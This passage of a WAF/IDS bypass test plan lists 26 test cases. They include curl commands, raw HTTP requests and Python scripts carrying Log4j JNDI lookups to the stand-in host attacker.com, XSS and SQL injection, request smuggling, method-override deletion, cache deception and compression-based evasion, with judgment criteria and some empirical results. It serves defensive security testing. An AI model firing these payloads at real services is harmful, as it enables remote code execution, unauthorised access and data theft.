  -d '{"user_id":"${jndi:ldap://attacker.com/a}"}'

# Unicode Escape variant
curl -X POST https://target.example.com/api/auth/verify \
  -H "Content-Type: application/json" \
  -d '{"user_id":"\u0024\u007bjndi:ldap://attacker.com/a\u007d"}'
```

**Automation Tool (WAF-Bypass)**:

```bash
# WAF-Bypass RCE category includes Log4j JNDI payloads (12~15.json)
# URL-encoded JNDI, nested lookup ${lower:l}${lower:d}a${lower:p} etc. auto-test
python3 main.py --host='https://target.example.com' \
  --block-code=403 --threads=10 --details --curl-replay

# Base64/UTF-16 encoding variations also auto-applied
```

**Judgment Criteria**:
- If normal request is blocked and bypass request passes → JSON normalization deficiency confirmed
- If server-side logs show `${jndi:ldap://...}` restored and executed → actually vulnerable

---

### **TC-02. Path/Parameter Detection Bypass via Double URL Encoding**

**Target Gap**: Encoding/normalization discrepancy  
**Purpose**: Verify whether WAF/IDS recursively decodes multi-level URL encoding

**Test Requests**:

```bash
# Single encoding (detection expected)
curl "https://target.example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

# Double encoding (detection verification)
curl "https://target.example.com/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# Mixed encoding (partial double encoding)
curl "https://target.example.com/search?q=%253Cscript%3Ealert(1)%253C/script%253E"
```

**Decoding Flow**:
| Stage | Value |
| :---- | :---- |
| Original (double encoded) | `%253Cscript%253E` |
| WAF first decode | `%3Cscript%3E` (recognized as harmless string) |
| Backend second decode | `<script>` (restored to executable tag) |

**Automation Tool (Cortisol)**:

```bash
# Auto-test double/triple encoding for SQLi/XSS/LFI/SSRF with Cortisol
python3 cortisol.py -t https://target.example.com/search -p q -a xss
python3 cortisol.py -t https://target.example.com/page -p id -a sqli

# UTF-8 Overlong Sequence test (Zig version)
# < → %C0%BC (2-byte), %E0%80%BC (3-byte), %F0%80%80%BC (4-byte)
# ' → %C0%A7, " → %C0%A2
cortisol -t https://target.example.com/search -p q -a xss -T doubleurlencode
```

**Additional Overlong UTF-8 Manual Test**:

```bash
# < encoded as 2-byte overlong
curl "https://target.example.com/search?q=%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE"

# < encoded as 3-byte overlong
curl "https://target.example.com/search?q=%E0%80%BCscript%E0%80%BEalert(1)%E0%80%BC/script%E0%80%BE"
```

**Judgment Criteria**: If single encoding is blocked but double encoding or Overlong UTF-8 passes → recursive decoding/non-standard character handling not applied

---

### **TC-03. Signature Bypass via Log4j Nested Lookup Variants**

**Target Gap**: Application internal substitution / Lookup processing  
**Purpose**: Verify detection of Lookup variants beyond fixed keywords (`jndi:ldap`)

**Test Payload Set** (Insert into any field of Header or Body):

```
# Case Variation
${JnDi:lDaP://attacker.com/a}

# lower/upper function nesting
${${lower:j}ndi:${lower:l}dap://attacker.com/a}

# String splitting via Default Value syntax
${j${::-n}di:ldap://attacker.com/a}
${jndi:ldap${::-:}//attacker.com/a}

# Environment variable Lookup nesting
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}

# Recursive Lookup (multi-level)
${${lower:${lower:jndi}}:${lower:ldap}://attacker.com/a}
```

**curl Command (User-Agent header injection example)**:

```bash
# Basic detection baseline
curl -H 'User-Agent: ${jndi:ldap://attacker.com/a}' \
  https://target.example.com/

# Default Value splitting
curl -H 'User-Agent: ${j${::-n}di:ldap://attacker.com/a}' \
  https://target.example.com/

# lower function nesting
curl -H 'User-Agent: ${${lower:j}ndi:${lower:l}dap://attacker.com/a}' \
  https://target.example.com/
```

**WAF-Bypass Log4j Payloads (Automated)**:

```bash
# WAF-Bypass RCE category Log4j-specific payloads:
# 15.json: ${jndi:${lower:l}${lower:d}a${lower:p}://ex${upper:a}mple.com}
#   → URL-encoded: %24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com
# 12.json: ${jndi:dns://example.com/}
# 13.json: URL-encoded JNDI

# Auto-injected into 7 zones (URL, ARGS, BODY, COOKIE, USER-AGENT, REFERER, HEADER)
python3 main.py --host='https://target.example.com' --block-code=403 --curl-replay
```

**Judgment Criteria**:
- If only basic payloads are blocked and variants pass → fixed keyword-based rule limitation confirmed
- `${...}` structure itself is not detected → Generic Pattern not applied

---

### **TC-04. HTTP Parameter Pollution (HPP)**

**Target Gap**: Structural data manipulation  
**Purpose**: Verify interpretation differences between security appliances and backends for duplicate parameters

**Test Requests**:

```bash
# Duplicate parameter (GET)
curl "https://target.example.com/api/user?id=1&id=2%20OR%201=1"

# GET + POST mixed (parameter source confusion)
curl -X POST "https://target.example.com/api/user?id=1" \
  -d "id=2%20OR%201=1"

# Parameter multiplexing using array notation
curl "https://target.example.com/api/user?id[]=1&id[]=2%20OR%201=1"
```

**Expected Server-specific Processing Differences**:
| Environment | Same parameter `?id=1&id=2` processing result |
| :---- | :---- |
| ASP.NET | `id=1,2` (combined) |
| PHP/Apache | `id=2` (last value) |
| JSP/Tomcat | `id=1` (first value) |
| Python Flask | `id=1` (first value) |

**Judgment Criteria**: If WAF inspects only the first value (`1`) and backend processes the last value (`2 OR 1=1`) → HPP detection gap confirmed

---

### **TC-05. Access Control Bypass via Path Normalization Discrepancy**

**Target Gap**: Semantic Reinterpretation Gap / path normalization discrepancy  
**Purpose**: Verify interpretation differences between WAF rules and backend routing for path variations

**Test Requests**:

```bash
# Confirm normal blocking (admin path)
curl https://target.example.com/admin/dashboard

# Encoded slash
curl https://target.example.com/%2Fadmin%2Fdashboard

# Duplicate slash
curl https://target.example.com//admin//dashboard

# Relative path insertion
curl https://target.example.com/public/../admin/dashboard

# Dot-segment + encoding mix
curl https://target.example.com/public/..%2Fadmin%2Fdashboard

# Null byte insertion (for legacy servers)
curl https://target.example.com/admin%00.jpg
```

**Judgment Criteria**: If normal path is blocked but variant path passes and backend routes to the same resource → Path normalization gap confirmed

---

### **TC-06. URL/Method Path Manipulation via Override Headers**

**Target Gap**: Semantic Reinterpretation Gap (missing pre/post-routing re-evaluation)  
**Purpose**: Verify whether non-standard headers cause execution of paths/methods different from those inspected by WAF

**URL Override Test**:

```bash
# X-Original-URL header
curl https://target.example.com/public/safe-page \
  -H "X-Original-URL: /admin/delete-user?id=1"

# X-Rewrite-URL header
curl https://target.example.com/public/safe-page \
  -H "X-Rewrite-URL: /admin/delete-user?id=1"

# X-Forwarded-Prefix header
curl https://target.example.com/safe-page \
  -H "X-Forwarded-Prefix: /admin"

# Next.js x-middleware-subrequest (CVE-2025-29927)
curl https://target.example.com/admin/dashboard \
  -H "x-middleware-subrequest: middleware:middleware:middleware"
```

**Method Override Test**:

```bash
# Send as POST but attempt DELETE execution via Method Override header
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method-Override: DELETE"

# X-HTTP-Method header variant
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method: PUT" \
  -d '{"role":"admin"}'

# X-Method-Override header variant
curl -X POST https://target.example.com/api/user/1 \
  -H "X-Method-Override: DELETE"
```

**Judgment Criteria**:
- If WAF allows based on `/public/safe-page` but server executes admin functions → URL Override not blocked
- If WAF allows through as POST but server executes as DELETE/PUT → Method Override not blocked

---

### **TC-07. HTTP Request Smuggling (HRS)**

**Target Gap**: Protocol boundary gap  
**Purpose**: Verify request boundary interpretation differences between frontend (WAF) and backend

**CL.TE Attack (Content-Length-first server → Transfer-Encoding-first server)**:

```http
POST / HTTP/1.1
Host: target.example.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**TE.CL Attack**:

```http
POST / HTTP/1.1
Host: target.example.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**0.CL desync (James Kettle 2025)**:

```http
POST / HTTP/1.1
Host: target.example.com
Content-Length: 0
Transfer-Encoding: chunked

GET /admin HTTP/1.1
Host: target.example.com

```

**Automation Tool (Smuggler)**:

```bash
# Basic scan (60+ Transfer-Encoding variations auto-test)
python3 smuggler.py -u https://target.example.com/

# Exhaustive scan (300+ variations: case mixing, line breaks, duplicate headers, control characters etc.)
python3 smuggler.py -u https://target.example.com/ -c exhaustive.py

# Double-byte combination scan (simultaneous control character insertion at 2 positions)
python3 smuggler.py -u https://target.example.com/ -c doubles.py

# Extended timeout for slow networks
python3 smuggler.py -u https://target.example.com/ -t 10 -l smuggler.log

# Discovered payloads automatically saved to payloads/ directory
# Example: payloads/https_target_example_com_CLTE_midspace-09.txt
```

**Key Transfer-Encoding Variations Tested by Smuggler**:

| Variation Type | Example |
| :---- | :---- |
| Leading space/tab | `·Transfer-Encoding: chunked`, `Transfer-Encoding:\tchunked` |
| Control character insertion | `Transfer-Encoding:%0Bchunked`, `Transfer-Encoding:\xFFchunked` |
| Case mixing | `TrAnSFer-EnCODinG: cHuNkeD` |
| Line break wrapping | `Transfer-Encoding:\n chunked` |
| Duplicate header | `Transfer-Encoding: cow\r\nTransfer-Encoding: chunked` |
| Delimiter variation | `Transfer Encoding: chunked` (space), `Transfer_Encoding: chunked` (underscore) |
| Value wrapping | `Transfer-Encoding: "chunked"`, `Transfer-Encoding: 'chunked'` |
| Suffix addition | `Transfer-Encoding: chunked, cow` |

**Burp Suite HTTP Request Smuggler (HTTP/2 included)**:

```
# Burp Suite → Extensions → HTTP Request Smuggler (v3.0)
# Auto-scan target URL:
# - CL.TE, TE.CL (HTTP/1.1)
# - H2.CL, H2.TE, H2.0 (HTTP/2 downgrade)
# - Pause-based desync
# - Client-side desync
# - Auto-detects parser discrepancy
```

**Judgment Criteria**:
- If the second request (smuggled request) is processed separately and affects other user sessions → HRS vulnerable
- `405 Method Not Allowed` etc. If abnormal responses occur in subsequent requests → request boundary mismatch suspected
- If Smuggler creates files in `payloads/` directory → desync confirmed for that variation

---

### **TC-08. IDS Detection Bypass via TCP Segmentation**

**Target Gap**: Protocol boundary gap / network layer visibility  
**Purpose**: Verify whether IDS fully reassembles and inspects fragmented TCP segments

**Segmented Transmission Using Scapy (Python)**:

```python
from scapy.all import *

target = "target.example.com"
target_ip = "x.x.x.x"
dport = 80

payload = (
    "GET /search?q=<script>alert(1)</script> HTTP/1.1\r\n"
    "Host: {}\r\n\r\n".format(target)
)

ip = IP(dst=target_ip)
syn = ip / TCP(dport=dport, flags="S")
syn_ack = sr1(syn)

ack = ip / TCP(dport=dport, flags="A",
               seq=syn_ack.ack, ack=syn_ack.seq + 1)
send(ack)

for i in range(0, len(payload), 2):
    segment = ip / TCP(dport=dport, flags="PA",
                       seq=syn_ack.ack + i,
                       ack=syn_ack.seq + 1) / payload[i:i+2]
    send(segment)
```
`nmap --mtu` and similar simple techniques cannot substitute for actual application-layer segment reassembly verification, so they were not adopted even as auxiliary methods in this TC.

**Retest Supplement (2026-03-11)**:

- In addition to existing `header split`, `body split`, `8-byte split`, actual app header contracts(`x-app-agent`, `x-app-crypted-sid`)were added for baseline verification with `GET /api/app/metadata`.
- Under identical endpoint/header conditions:
  - benign control is baseline `403`, segmented also `403`
  - plain JNDI referer is baseline `timeout`, segmented also maintains hold/drop behavior without server payload response
  - unicode escape referer is baseline `403`, segmented also `403`
- `post_header_body_split` pcap shows the frontend returned `HTTP/1.1 403 Forbidden` before receiving the complete first header fragment.

**Judgment Criteria**:

- If blocked during normal-size transmission but passes when segmented → session reassembly limitation suspected
- However, bypass conclusions should not be drawn from a single segmented request without benign/plain/unicode control comparisons.
- The conclusion from this retest is: `actual segmentation execution is demonstrated`, `no evidence that segmentation itself caused additional bypass`.

---

### **TC-09. Body Parsing Bypass via Multipart Boundary Manipulation**

**Target Gap**: Inspection mode selection gap / Structural data manipulation  
**Purpose**: Verify whether WAF correctly parses non-standard Multipart structures

**Duplicate Boundary Definition**:

```http
POST /upload HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary=abc; boundary=xyz

--xyz
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

<script>alert(1)</script>
--xyz--
```

**Whitespace/Special Character Insertion in Boundary**:

```http
POST /upload HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary="abc def"

--abc def
Content-Disposition: form-data; name="payload"

${jndi:ldap://attacker.com/a}
--abc def--
```

**Content-Type Removal (WAFFLED Technique)**:

```bash
# Send JSON without Content-Type → WAF fails to select parser branch
curl -X POST https://target.example.com/api/data \
  --data-binary '{"q":"<script>alert(1)</script>"}' \
  -H "Content-Length: 40"

# Insert unusual charset into Content-Type
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json; charset=ibm037" \
  -d '{"q":"<script>alert(1)</script>"}'
```

**curl Command**:

```bash
curl -X POST https://target.example.com/upload \
  -H 'Content-Type: multipart/form-data; boundary=abc; boundary=xyz' \
  --data-binary $'--xyz\r\nContent-Disposition: form-data; name="q"\r\n\r\n<script>alert(1)</script>\r\n--xyz--'
```

**Automation Tool (WAFFLED)**:

```bash
# WAFFLED fuzzer auto-generates Multipart/JSON/XML structure variations
cd waffled && python3 t-reqs-modified/code/fuzzer.py \
  --grammar fuzzer-grammar/multipart/multipart_simple \
  --output /tmp/waffled_payloads/

# RFC 2231 parameter continuation test (boundary splitting)
python3 t-reqs-modified/code/fuzzer.py \
  --grammar fuzzer-grammar/multipart/multipart_param

# Send generated raw requests via http-request-relay (curl normalizes headers, cannot use)
cd http-request-relay && go build -o relay
./relay -target target.example.com:443 -tls -input /tmp/waffled_payloads/
```

**Additional Bypass Techniques Found by WAFFLED**:

```bash
# NUL byte injection (WAF stops parsing at NUL, backend ignores and continues)
# NUL in Content-Type: multipart/form-data\x00; boundary=real
# NUL in JSON key: {"field1\x00":"<script>alert(1)</script>"}
# NUL in Content-Disposition: form-da\x00ta; name="field1"

# RFC 2231 boundary splitting (bypasses when WAF doesn't support RFC 2231)
# Content-Type: multipart/form-data; boundary*0=re;boundary*1=al
# → WAF cannot recognize boundary, backend combines as "real"

# Content-Type header name variation
# Content_-Type: multipart/form-data (underscore insertion)
# Cntent-Type: multipart/form-data (character omission)
# ContentType: application/json (hyphen removal)

# CRLF variation
# boundary=real\r\r\n (double CR)
# boundary=real;\r\n (trailing semicolon)
```

**Judgment Criteria**:
- If WAF parses with first boundary (`abc`) and misses payload, while server executes with second boundary (`xyz`) → Multipart parsing gap
- If WAF skips inspection when sent without Content-Type → inspection mode selection gap
- If WAF stops parsing at NUL byte insertion point → NUL byte termination vulnerability

---

### **TC-10. Custom Encryption Segment Visibility Verification**

**Target Gap**: Encryption/decryption segment  
**Purpose**: Verify whether IDS/WAF loses visibility in segments using custom encryption modules

**Test Method**:

```bash
# 1. Send plaintext attack payload → verify WAF detection
curl -X POST https://target.example.com/api/service \
  -H "Content-Type: application/json" \
  -d '{"cmd":"${jndi:ldap://attacker.com/a}"}'

# 2. Send same payload wrapped with target service's custom encryption logic
#    (Encryption keys/algorithms obtained through client app reverse engineering)
python3 encrypt_payload.py '{"cmd":"${jndi:ldap://attacker.com/a}"}' | \
  curl -X POST https://target.example.com/api/service \
    -H "Content-Type: application/octet-stream" \
    --data-binary @-

# 3. Check server-side logs for post-decryption execution traces
```

**Judgment Criteria**:
- If blocked in plaintext but passes when encrypted → encryption segment visibility loss confirmed
- If attack traces remain in server logs → server-side RASP/EDR absence confirmed

---

### **TC-11. Inspection Mode Selection Bypass via Content-Type Manipulation (WAFFLED)**

**Target Gap**: Inspection mode selection gap  
**Purpose**: Verify whether WAF enters the correct parser branch when Content-Type is modified

**Test Requests**:

```bash
# Baseline: verify detection with normal Content-Type
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"q":"<script>alert(1)</script>"}'

# Content-Type removal
curl -X POST https://target.example.com/api/data \
  -H "Content-Length: 40" \
  --data-binary '{"q":"<script>alert(1)</script>"}'

# Content-Type case variation
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: Application/JSON" \
  -d '{"q":"<script>alert(1)</script>"}'

# Insert additional parameters into Content-Type
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json; charset=utf-8; boundary=fake" \
  -d '{"q":"<script>alert(1)</script>"}'

# Change Content-Type to text/plain (if server parses as JSON)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: text/plain" \
  -d '{"q":"<script>alert(1)</script>"}'

# Content-Disposition field name variation in multipart (WAFFLED)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: multipart/form-data; boundary=x" \
  --data-binary $'--x\r\nContent-Disposition: form-data; name="q"\r\n\r\n<script>alert(1)</script>\r\n--x--'
```

**Automation Tool (WAFFLED + WAF-Bypass)**:

```bash
# WAFFLED: auto-generate Content-Type + structure variations via grammar-based approach
cd waffled && python3 t-reqs-modified/code/fuzzer.py \
  --grammar fuzzer-grammar/json/json_simple \
  --output /tmp/waffled_json/

# WAF-Bypass: Content-Type variation test with API/MFD categories
# API category sends as application/json, MFD as multipart/form-data with same payloads
python3 main.py --host='https://target.example.com' \
  --block-code=403 --details --curl-replay
```

**Judgment Criteria**:
- If detection only works with normal Content-Type and variants pass → inspection mode selection gap confirmed
- If server parses as JSON regardless of Content-Type and executes → actual bypass established

---

### **TC-12. Inspection Scope Bypass via Body Oversize**

**Target Gap**: Inspection scope gap  
**Purpose**: Verify detection when payloads are placed beyond WAF body inspection size limits

**Test Method (Python)**:

```python
import requests

target = "https://target.example.com/api/data"

# WAF body inspection limit probing (typically 8KB, 16KB, 64KB etc.)
for size_kb in [8, 16, 32, 64, 128]:
    padding = "A" * (size_kb * 1024)
    payload = '{"padding":"' + padding + '","cmd":"${jndi:ldap://attacker.com/a}"}'

    resp = requests.post(target,
        headers={"Content-Type": "application/json"},
        data=payload,
        verify=False)

    print(f"[{size_kb}KB padding] Status: {resp.status_code}, "
          f"Length: {len(resp.content)}, "
          f"Blocked: {'WAF' in resp.text or resp.status_code == 403}")
```

**curl Quick Test**:

```bash
# Place payload after 8KB padding
python3 -c "print('A'*8192)" | \
  xargs -I{} curl -X POST https://target.example.com/api/data \
    -H "Content-Type: application/json" \
    -d '{"padding":"{}","cmd":"${jndi:ldap://attacker.com/a}"}'

# Exceed inspection limit with large JSON array
python3 -c "
import json
arr = ['safe'] * 10000 + ['<script>alert(1)</script>']
print(json.dumps({'items': arr}))
" | curl -X POST https://target.example.com/api/data \
    -H "Content-Type: application/json" \
    --data-binary @-
```

**Judgment Criteria**:
- If same payload is not detected above a certain size → body inspection size limit confirmed
- The size at which `403` transitions to `200` is the WAF's inspection limit

---

### **TC-13. ACL Bypass via HTTP Method Override**

**Target Gap**: Semantic Reinterpretation Gap  
**Purpose**: Verify whether override headers can change the actual execution method when WAF applies ACLs based on HTTP Method

**Test Requests**:

```bash
# Baseline: direct DELETE method call (WAF blocking expected)
curl -X DELETE https://target.example.com/api/user/1

# Bypass via X-HTTP-Method-Override header
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method-Override: DELETE"

# X-HTTP-Method header variant
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method: DELETE"

# X-Method-Override header variant
curl -X POST https://target.example.com/api/user/1 \
  -H "X-Method-Override: DELETE"

# _method parameter (supported by some frameworks)
curl -X POST https://target.example.com/api/user/1 \
  -d "_method=DELETE"

# Privilege escalation attempt via PUT
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**Judgment Criteria**:
- If DELETE is directly blocked but deletion executes via POST + Override header → Method Override not blocked
- If privilege change succeeds via PUT → ACL bypass confirmed

---

### **TC-14. Web Cache Deception (CDN/Cache-Origin Normalization Discrepancy)**

**Target Gap**: Middle-layer to backend normalization gap  
**Purpose**: Verify whether CDN/cache and origin server interpret paths differently, causing dynamic responses to be cached

**Test Requests**:

```bash
# Add static extensions to dynamic page while authenticated
curl -b "session=VALID_SESSION" \
  https://target.example.com/my-account/profile.css

# Exploit path delimiter difference (semicolon)
curl -b "session=VALID_SESSION" \
  "https://target.example.com/my-account;x.css"

# Encoded delimiter
curl -b "session=VALID_SESSION" \
  "https://target.example.com/my-account%2F..%2Fstatic/style.css"

# Then access same URL without authentication → verify cached dynamic response
curl https://target.example.com/my-account/profile.css
```

**Automation Tool (WCD Testing Tool)**:

```bash
# 6 extensions(.css, .jpg, .png, .txt, .html, .ico) × 8 delimiters(; @ , ! ~ % # ?) auto-test
python3 cache_deception_test.py \
  --url "https://target.example.com/my-account" \
  --cookie "session=VALID_SESSION"

# Test flow:
# 1. Request base_url + extension/delimiter while authenticated
# 2. Check Cache-Control header for "public" or "max-age" verification
# 3. Search response body for sensitive keywords: username, email, token, session etc.
# 4. Re-request same URL without cookies to verify cross-user exposure
```

**Tool Test URL Patterns**:

```
# Extension test
https://target.example.com/my-account.css
https://target.example.com/my-account.jpg
https://target.example.com/my-account.ico

# Delimiter test
https://target.example.com/my-account;cache
https://target.example.com/my-account@cache
https://target.example.com/my-account!cache
https://target.example.com/my-account~cache
```

**Judgment Criteria**:
- If URL accessed without authentication returns response containing authenticated user's personal info/tokens → Web Cache Deception vulnerable
- If response header contains `X-Cache: HIT`, `CF-Cache-Status: HIT`, or `Age:` → cache hit confirmed verification

---

### **TC-15. JSON Partial Parse / Fallback / Lax Parsing verification**

**Target Gap**: Inspection scope gap / JSON inspection pipeline gap  
**Purpose**: Verify how fallback behavior is configured when WAF JSON parsing fails

**Test Requests**:

```bash
# Baseline: normal JSON (detection expected)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"q":"<script>alert(1)</script>"}'

# Invalid JSON (intentional syntax error insertion with payload placement)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"valid":"value",,,"q":"<script>alert(1)</script>"}'

# JSON with trailing comma + payload
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"a":"b","q":"<script>alert(1)</script>",}'

# Extremely high nesting depth to induce parser limits
python3 -c "
depth = 500
payload = '{\"a\":' * depth + '\"<script>alert(1)</script>\"' + '}' * depth
print(payload)
" | curl -X POST https://target.example.com/api/data \
    -H "Content-Type: application/json" \
    --data-binary @-

# Comment insertion within JSON (non-standard but some parsers allow)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"q":/* comment */"<script>alert(1)</script>"}'

# Duplicate key conflict
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"q":"safe","q":"<script>alert(1)</script>"}'
```

**Judgment Criteria**:
- If detection only works with normal JSON and invalid JSON passes → JSON fallback policy set to NO_MATCH
- If detection fails when parser limit (nesting depth) is exceeded → inspection scope gap confirmed
- If server uses lenient parser (allowing trailing comma, comments) and payload executes → parser mismatch
- If WAF and app adopt different values from duplicate keys → JSON duplicate key ambiguity confirmed

---

### **TC-16. Desync via HTTP/2 Downgrade**

**Target Gap**: Protocol boundary gap  
**Purpose**: Verify parsing differences when HTTP/2 frontend downgrades to HTTP/1.1 backend

**Test Method**:

```bash
# Connect via HTTP/2 but insert HTTP/1.1-only headers
curl --http2 https://target.example.com/ \
  -H "Transfer-Encoding: chunked"

# HTTP/2 pseudo-header and Host header mismatch
curl --http2 https://target.example.com/ \
  -H ":authority: target.example.com" \
  -H "Host: evil.example.com"

# HTTP/2 CRLF injection attempt (insert \r\n in header values)
python3 -c "
import socket, ssl, h2.connection, h2.config, h2.events

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()

# CRLF insertion attempt in headers
headers = [
    (':method', 'GET'),
    (':path', '/'),
    (':scheme', 'https'),
    (':authority', 'target.example.com'),
    ('x-custom', 'value\r\nTransfer-Encoding: chunked'),
]
conn.send_headers(1, headers)
# ... socket transmission logic
"
```

**Burp Suite-based Testing**:

```
# Burp Suite → HTTP Request Smuggler extension
# Auto-scan for H2.CL, H2.TE, H2.0 desync against target URL
# Manual verification by directly editing HTTP/2 raw headers in Inspector
```

**Judgment Criteria**:
- If headers are reinterpreted during HTTP/2 to HTTP/1.1 conversion → downgrade desync possible
- If `Transfer-Encoding: chunked` is ignored in HTTP/2 but applied after downgrade → HRS possible

---

### **TC-17. Duplicate Header / Canonicalization Conflict**

**Target Gap**: Semantic Reinterpretation Gap / canonicalization mismatch  
**Purpose**: Verify whether edge, proxy, and origin interpret duplicate headers and notation variants as the same value

**Test Requests**:

```http
GET / HTTP/1.1
Host: safe.example.com
Host: admin.example.com
Connection: close
```

```http
POST /api HTTP/1.1
Host: target.example.com
Content-Type: application/json
Content-Type: text/plain

{"q":"${jndi:ldap://attacker/a}"}
```

**Judgment Criteria**:
- If WAF judgment header differs from origin final adopted header → canonicalization conflict
- If results differ based on notation variants like `Transfer-Encoding`/`Transfer Encoding`/`Transfer_Encoding` → strict parsing insufficient

### **TC-18. Compressed Body Inspection (gzip/deflate/br)**

**Target Gap**: Inspection scope gap / content decoding space  
**Purpose**: Verify whether compressed body is decompressed before inspection

**Test Requests**:

```bash
python3 - <<'PY'
import gzip, sys
body=b'{"q":"${jndi:ldap://attacker/a}"}'
sys.stdout.buffer.write(gzip.compress(body))
PY | curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -H "Content-Encoding: gzip" \
  --data-binary @-
```

**Empirical Results (Service-B, 2026-03-12)**:
| Condition | Uncompressed | gzip | deflate |
| :---- | :---- | :---- | :---- |
| Normal body | 302 | 302 | - |
| JNDI body | timeout (blocked) | 302 (passed) | 302 (passed) |

→ IPS does not decompress `Content-Encoding` and only performs raw matching. Compressed body bypass **confirmed**.

**IPS/WAF Vendor Decompression Settings**:
| Vendor | Configuration Item |
| :---- | :---- |
| Snort | `http_inspect` → `decompress_gzip true`, `decompress_deflate true` |
| Suricata | `suricata.yaml` → `app-layer.protocols.http.decompression.enabled: yes` |
| Palo Alto | Threat Prevention profile → Inspect Compressed Content |
| Fortinet | WAF/IPS profile → Decompress Content |

**Judgment Criteria**:
- If plaintext is blocked but compressed body passes → post-decompression inspection insufficient
- If policies differ when post-decompression size becomes oversize → post-decoding scope policy mismatch

### **TC-19. Authority / Host / Forwarded Mismatch**

**Target Gap**: Semantic Reinterpretation Gap / routing authority mismatch  
**Purpose**: Verify which value is used for actual routing when Host, `:authority`, and forwarded headers conflict

**Test Requests**:

```bash
curl --http2 https://target.example.com/ \
  -H "Host: target.example.com" \
  -H "X-Forwarded-Host: admin.internal.example.com"
```

**Judgment Criteria**:
- If security judgment criteria differ from origin routing criteria → ACL/cache key mismatch risk
- If absolute URL/redirect differs based on `X-Forwarded-Proto`, `X-Forwarded-Port` combinations → proxy trust boundary needs re-examination

### **TC-20. Cache Key Poisoning / Unkeyed Input**

**Target Gap**: Middle-layer to backend normalization gap / cache key mismatch  
**Purpose**: Verify poisoning and unkeyed input, not cache deception

**Test Requests**:

```bash
curl -I "https://target.example.com/account?utm_source=a"
curl -I "https://target.example.com/account?utm_source=b"
curl -H "X-Forwarded-Host: attacker.example" https://target.example.com/account
```

**Judgment Criteria**:
- If input not reflected in cache key persists in other users' responses → cache poisoning / unkeyed input
- If `Age`, `X-Cache`, `CF-Cache-Status` show hits but response content is corrupted → public cache risk

### **TC-21. Cookie Duplicate / Oversize Inspection**

**Target Gap**: Inspection scope gap / cookie interpretation mismatch  
**Purpose**: Verify interpretation differences for duplicate cookies and long cookie chains

**Test Requests**:

```http
Cookie: role=user; role=admin
```

```http
Cookie: session=AAA...AAA; pad=BBBB...BBBB; exploit=${jndi:ldap://attacker/a}
```

**Judgment Criteria**:
- If WAF adopts first cookie and app adopts last cookie → duplicate cookie ambiguity
- If inspection truncation occurs in long cookie chains → cookie scope gap

### **TC-22. JSON Duplicate Key Ambiguity**

**Target Gap**: JSON inspection pipeline gap / Semantic Reinterpretation Gap  
**Purpose**: Verify bypass through duplicate key handling differences

**Test Requests**:

```json
{"role":"user","role":"admin"}
```

```json
{"q":"safe","q":"${jndi:ldap://attacker/a}"}
```

**Judgment Criteria**:
- If WAF adopts first value and app adopts last value → duplicate key ambiguity
- If app accepts without error but security appliance judges only as normal JSON → parser parity insufficient

### **TC-23. Charset / BOM / UTF-16 Parsing Gap**

**Target Gap**: Inspection mode selection gap / normalization space  
**Purpose**: Verify whether raw bytes and application-restored meaning differ based on charset/BOM

**Test Requests**:

- `Content-Type: application/json; charset=utf-16le`
- Insert `${...}` or `<script>` in UTF-16LE + BOM JSON
- Compare UTF-8 baseline with UTF-16 variant

**Judgment Criteria**:
- If raw byte-based inspection and post-restoration meaning differ → charset parsing gap
- If detection/blocking results differ based on BOM presence → parser branch mismatch

### **TC-24. Chunk Extension / Trailer Header Parsing**

**Target Gap**: Protocol boundary gap / parser discrepancy  
**Purpose**: Verify whether chunk extensions and trailer headers are missed in the inspection path

**Test Requests**:

```http
Transfer-Encoding: chunked

4;foo=bar
test
0
X-Ignore: a
```

**Judgment Criteria**:
- If WAF ignores chunk extension/trailer and only backend processes them → parser discrepancy
- If trailer acts as security-relevant metadata → backend interpretation mismatch

### **TC-25. HTTP/3 Visibility Parity**

**Target Gap**: Encryption/protocol visibility gap  
**Purpose**: Verify HTTP/3 and H1/H2 policy/visibility parity

**Execution Conditions**: Execute only when target actually supports H3

**Judgment Criteria**:
- If only H3 requests differ in response fingerprint, header canonicalization, visibility chain → protocol parity gap
- This TC prioritizes coverage verification over vulnerability proof.

### **TC-26. WebSocket Upgrade / Post-Handshake Blind Spot**

**Target Gap**: Inspection scope gap / insufficient protocol-aware inspection  
**Purpose**: Verify WebSocket handshake and post-handshake frame visibility differences

**Execution Conditions**: Execute only when real-time endpoints such as `/ws`, `/socket`, subscription, SSE are confirmed

**Judgment Criteria**:
- If only handshake is inspected and frame payload is blind spot → post-handshake blind spot
